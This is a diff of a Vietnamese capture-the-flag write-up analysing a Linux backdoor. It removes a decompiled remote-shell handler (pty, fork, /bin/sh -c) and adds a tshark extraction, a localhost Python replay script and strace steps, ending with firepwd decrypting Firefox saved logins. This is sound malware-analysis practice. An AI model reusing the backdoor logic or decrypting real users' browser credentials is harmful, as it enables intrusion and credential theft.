@@ -228,203 +228,63 @@ Mình thu được file 16E.zip và file này cần password:
 Mục tiêu của chúng ta bây giờ là đi tìm password , để ý thấy các stream bên trong wireshark đã bị mã hóa nên ta không thể thu được mật khẩu nên chúng ta quay lại vào ida, mò vào các hàm sub_63D3(fd) , sub_6476(fd),sub_6523(fd). Luồng sơ đồ cho dễ hình dung
 Main->sub_6A00( backdoor) -> (sub_63D3(fd) . sub_6476(fd) . sub_6523(fd) ) 3 hàm này mình nghĩ tương ứng với 3 chức năng lần lượt là mở shell, đánh cắp dữ liệu, và đẩy file 
 
-Mình tiến hành kiểm tra thử hàm sub_6523 trước vì nó ở ngay trên hàm main mình đỡ phải tìm :
-```
-__int64 __fastcall sub_6523(int fd)
-{
-  int v2; // edx
-  __int64 result; // rax
-  char *v4; // rdx
-  char *v5; // rax
-  int v6; // edx
-  int v7; // edi
-  char *v8; // rax
-  char *v9; // rbp
-  int v10; // edx
-  int v11; // edx
-  int v12; // edx
-  int v13; // eax
-  char *v14; // rbp
-  __pid_t v15; // edx
-  __pid_t v16; // edx
-  int v17; // edx
-  void *v18; // rax
-  int v19; // r12d
-  __int64 v20; // r13
-  fd_set *p_readfds; // rax
-  int v22; // eax
-  ssize_t v23; // rax
-  int v24; // eax
-  int aslave; // [rsp+Ch] [rbp-BCh] BYREF
-  int amaster; // [rsp+10h] [rbp-B8h] BYREF
-  int v27; // [rsp+14h] [rbp-B4h]
-  _WORD v28[4]; // [rsp+18h] [rbp-B0h] BYREF
-  fd_set readfds; // [rsp+20h] [rbp-A8h] BYREF
-  char v30; // [rsp+A0h] [rbp-28h] BYREF
+Có vẻ như hướng này tịt nên mình chuyển qua phân tích động malware , chúng ta cần trích xuất phần dữ liệu thuần (payload) từ các gói tin TCP hướng về cổng dịch vụ của mã độc (cổng 1234).
 
-  v2 = openpty(&amaster, &aslave, 0LL, 0LL, 0LL);
-  result = 24LL;
-  if ( v2 >= 0 )
-  {
-    v4 = ttyname(aslave);
-    result = 25LL;
-    if ( v4 )
-    {
-      v5 = (char *)malloc(0xAuLL);
-      if ( v5 )
-      {
-        strcpy(v5, "HISTFILE=");
-        putenv(v5);
-        v6 = sub_1818(fd);
-        result = 37LL;
-        if ( v6 == 1 )
-        {
-          v7 = v27;
-          *(&buf + v27) = 0;
-          v8 = (char *)malloc(v7 + 6);
-          v9 = v8;
-          if ( v8 )
-          {
-            *v8 = 84;
-            v8[3] = 77;
-            v8[1] = 69;
-            v8[4] = 61;
-            v8[2] = 82;
-            strncpy(v8 + 5, &buf, v27 + 1);
-            putenv(v9);
-            v10 = sub_1818(fd);
-            result = 39LL;
-            if ( v10 == 1 && v27 == 4 )
-            {
-              v28[0] = (unsigned __int8)byte_FBC1 + ((unsigned __int8)buf << 8);
-              v28[1] = (unsigned __int8)byte_FBC3 + ((unsigned __int8)byte_FBC2 << 8);
-              v28[2] = 0;
-              v28[3] = 0;
-              v11 = ioctl(amaster, 0x5414uLL, v28);
-              result = 40LL;
-              if ( v11 >= 0 )
-              {
-                v12 = sub_1818(fd);
-                result = 41LL;
-                if ( v12 == 1 )
-                {
-                  v13 = v27;
-                  *(&buf + v27) = 0;
-                  v14 = (char *)malloc(v13 + 1);
-                  if ( v14 )
-                  {
-                    strncpy(v14, &buf, v27 + 1);
-                    v15 = fork();
-                    result = 43LL;
-                    if ( v15 >= 0 )
-                    {
-                      if ( v15 )
-                      {
-                        close(aslave);
-                        v19 = fd / 64;
-                        v20 = 1LL << (fd % 64);
-                        while ( 1 )
-                        {
-                          do
-                          {
-                            p_readfds = &readfds;
-                            do
-                            {
-                              p_readfds->fds_bits[0] = 0LL;
-                              p_readfds = (fd_set *)((char *)p_readfds + 8);
-                            }
-                            while ( p_readfds != (fd_set *)&v30 );
-                            readfds.fds_bits[v19] |= v20;
-                            v22 = amaster;
-                            readfds.fds_bits[amaster / 64] |= 1LL << (amaster % 64);
-                            if ( v22 < fd )
-                              v22 = fd;
-                            if ( select(v22 + 1, &readfds, 0LL, 0LL, 0LL) < 0 )
-                              return 49LL;
-                            if ( (v20 & readfds.fds_bits[v19]) != 0 )
-                            {
-                              if ( (unsigned int)sub_1818(fd) != 1 )
-                                return 50LL;
-                              v23 = write(amaster, &buf, v27);
-                              if ( v23 != v27 )
-                                return 51LL;
-                            }
-                          }
-                          while ( ((1LL << (amaster % 64)) & readfds.fds_bits[amaster / 64]) == 0 );
-                          v24 = read(amaster, &buf, 0x1000uLL);
-                          v27 = v24;
-                          if ( !v24 )
-                            return 54LL;
-                          if ( v24 < 0 )
-                            break;
-                          if ( (unsigned int)sub_155F(fd) != 1 )
-                            return 53LL;
-                        }
-                        return 52LL;
-                      }
-                      else
-                      {
-                        close(fd);
-                        close(amaster);
-                        v16 = setsid();
-                        result = 44LL;
-                        if ( v16 >= 0 )
-                        {
-                          v17 = ioctl(aslave, 0x540EuLL, 0LL);
-                          result = 45LL;
-                          if ( v17 >= 0 )
-                          {
-                            dup2(aslave, 0);
-                            dup2(aslave, 1);
-                            dup2(aslave, 2);
-                            if ( aslave > 2 )
-                              close(aslave);
-                            v18 = malloc(8uLL);
-                            if ( v18 )
-                            {
-                              *(_BYTE *)v18 = 47;
-                              *((_BYTE *)v18 + 4) = 47;
-                              *((_BYTE *)v18 + 1) = 98;
-                              *((_BYTE *)v18 + 5) = 115;
-                              *((_BYTE *)v18 + 2) = 105;
-                              *((_BYTE *)v18 + 6) = 104;
-                              *((_BYTE *)v18 + 3) = 110;
-                              *((_BYTE *)v18 + 7) = 0;
-                              execl((const char *)v18, (const char *)v18 + 5, "-c", v14, 0LL);
-                              return 48LL;
-                            }
-                            else
-                            {
-                              return 47LL;
-                            }
-                          }
-                        }
-                      }
-                    }
-                  }
-                  else
-                  {
-                    return 42LL;
-                  }
-                }
-              }
-            }
-          }
-          else
-          {
-            return 38LL;
-          }
-        }
-      }
-      else
-      {
-        return 36LL;
-      }
-    }
-  }
-  return result;
-}
+tshark -r capture.pcap -Y "tcp.dstport == 1234 && tcp.len > 0" -T fields -e tcp.payload > client.txt
+
+
+Xây dựng Script Python Tái hiện Luồng (Replay Script):
+
 ```
+import socket
+import re
+import time
+
+# Đọc file chứa các chuỗi Hex payload, bỏ qua lỗi mã hóa độc hại
+with open('client.txt', 'r', encoding='utf-8', errors='ignore') as f:
+    lines = f.read().splitlines()
+
+HOST = "127.0.0.1"
+PORT = 1234
+
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+    s.connect((HOST, PORT))
+    i = 1
+    for line in lines:
+        # Lọc sạch, chỉ giữ lại các ký tự hệ Hex hợp lệ (0-9, a-f)
+        line = re.sub(r'[^0-9a-fA-F]', '', line)
+        
+        # Bỏ qua dòng trống hoặc chuỗi lẻ byte
+        if not line or len(line) % 2 != 0:
+            continue
+            
+        print(f"[+] Đang gửi gói tin thứ {i}...")
+        s.sendall(bytes.fromhex(line))
+        
+        # Tạo khoảng trễ 0.5 giây để tránh kích hoạt bộ đếm giờ tự sát (SIGALRM) của mã độc
+        time.sleep(0.5)
+        i += 1
+
+print("[!] Đã truyền tải toàn bộ payload thành công!")
+
+```
+
+Vì mã độc có cơ chế tự hủy dựa trên bộ đếm thời gian hệ thống (SIGALRM), việc phân tích động cần sử dụng công cụ giám sát tiến trình hệ thống strace để bắt trọn các lệnh thực thi (execve) và ghi dữ liệu (write) mà không bị gián đoạn
+
+strace -f -s 1000 -e trace=execve,write ./ic2kp -p 1234
+
+Sau đó cho chạy script python để truyền payload và mình thu được mật khẩu của file zip, Sử dụng mật khẩu này để giải nén tệp lưu lượng định danh của Firefox (16E.zip), kết hợp với công cụ firepwd cùng file key4.db / logins.json để giải mã và thu về Flag cuối cùng của thử thách.
+
+
+<img width="498" height="247" alt="image" src="https://github.com/user-attachments/assets/31d9aa56-bb5d-414a-955e-7285d060f666" />
+
+
+<img width="1632" height="856" alt="image" src="https://github.com/user-attachments/assets/9bcb0128-b8b9-47d6-801f-0f70ca16473d" />
+
+
+
+
+
 
 
 
